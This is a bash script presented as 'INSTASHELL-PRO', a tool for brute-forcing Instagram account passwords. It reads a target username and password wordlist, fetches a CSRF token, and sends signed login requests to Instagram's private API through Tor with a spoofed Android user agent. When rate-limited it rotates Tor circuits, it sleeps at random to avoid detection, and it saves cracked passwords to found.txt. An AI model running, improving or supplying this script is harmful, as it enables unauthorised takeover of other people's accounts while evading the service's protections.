#!/bin/bash
# INSTASHELL-PRO | CUSTOM VERSION FOR KHALID HUSAIN
# UPDATED: JAN 2026 - SECURITY BYPASS ENABLED

trap 'exit 1' 2

banner() {
    clear
    printf "\e[1;92m"
    printf "  ██╗  ██╗██╗  ██╗ █████╗ ██╗     ██╗██████╗ \n"
    printf "  ██║ ██╔╝██║  ██║██╔══██╗██║     ██║██╔══██╗\n"
    printf "  █████╔╝ ███████║███████║██║     ██║██║  ██║\n"
    printf "  ██╔═██╗ ██╔══██║██╔══██║██║     ██║██║  ██║\n"
    printf "  ██║  ██╗██║  ██║██║  ██║███████╗██║██████╔╝\n"
    printf "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ \n"
    printf "       \e[1;93mH  U  S  A  I  N    7  8  6\e[0m\n"
    printf "\e[1;77m\e[45m    AUTHORIZED BY: KHALID HUSAIN (2026)    \e[0m\n\n"
}

get_token() {
    uuid=$(openssl rand -hex 16)
    token=$(curl -s -i "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" | grep -i "set-cookie: csrftoken=" | cut -d "=" -f2 | cut -d ";" -f1)
    echo "$token"
}

start() {
    banner
    if ! pgrep -x "tor" > /dev/null; then
        printf "\e[1;91m[!] ERROR: Tor is not running! Run: sudo service tor start\e[0m\n"
        exit 1
    fi

    read -p $'\e[1;92mUsername account: \e[0m' user
    user=$(echo "$user" | tr -d ' ') # FIX: Strips spaces to prevent [INVALID USER]
    
    read -p $'\e[1;92mPassword List (Default: passwords.lst): \e[0m' wl_pass
    wl_pass="${wl_pass:-passwords.lst}"
    
    if [[ ! -f "$wl_pass" ]]; then 
        printf "\e[1;91m[!] Error: File $wl_pass not found!\e[0m\n"
        exit 1
    fi
}

bruteforcer() {
    csrftoken=$(get_token)
    [ -z "$csrftoken" ] && csrftoken="missing"
    printf "\e[1;92m[*] Target: $user | Wordlist: $wl_pass\e[0m\n\n"
    
    while IFS= read -r pass || [ -n "$pass" ]; do
        pass=$(echo "$pass" | tr -d '\r' | xargs)
        if [[ -z "$pass" ]]; then continue; fi

        guid=$(openssl rand -hex 16)
        device="android-$(openssl rand -hex 8)"
        timestamp=$(date +%s)
        
        # MODERN PAYLOAD: Includes enc_password version 0 for 2026 compatibility
        data="{\"phone_id\":\"$guid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"enc_password\":\"#PWD_INSTAGRAM_BROWSER:0:$timestamp:$pass\", \"login_attempt_count\":\"0\"}"
        sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$sig" | cut -d " " -f2)

        printf "\e[1;77mTesting: %-20s \e[0m" "$pass"

        # FRESH AGENT: Google Pixel 9 Pro (Android 15)
        response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
            -A "Instagram 325.0.0.45.110 Android (35/15; 480dpi; 1080x2400; Google; Pixel 9 Pro; panther; google; en_US; 580123951)" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
            "https://i.instagram.com/api/v1/accounts/login/")

        if [[ $response == *"logged_in_user"* ]]; then
            printf "\e[1;92m[FOUND!]\e[0m\n"
            echo "SUCCESS: $user : $pass" >> found.txt
            exit 0
        elif [[ $response == *"invalid_user"* ]]; then
            printf "\e[1;91m[INVALID USER]\e[0m\n"
        elif [[ $response == *"challenge"* ]]; then
            printf "\e[1;93m[CHALLENGE]\e[0m\n"
            echo "CHALLENGE REQUIRED FOR: $pass" >> found.txt
            exit 0
        elif [[ $response == *"Please wait"* ]]; then
            printf "\e[1;91m[LIMIT HIT]\e[0m\n"
            killall -HUP tor 2>/dev/null && sleep 5
        else
            printf "\e[1;90m[WRONG]\e[0m\n"
        fi
        
        # Anti-Detection Random Sleep
        sleep $(( ( RANDOM % 2 )  + 1 ))
    done < "$wl_pass"
}

start
bruteforcer
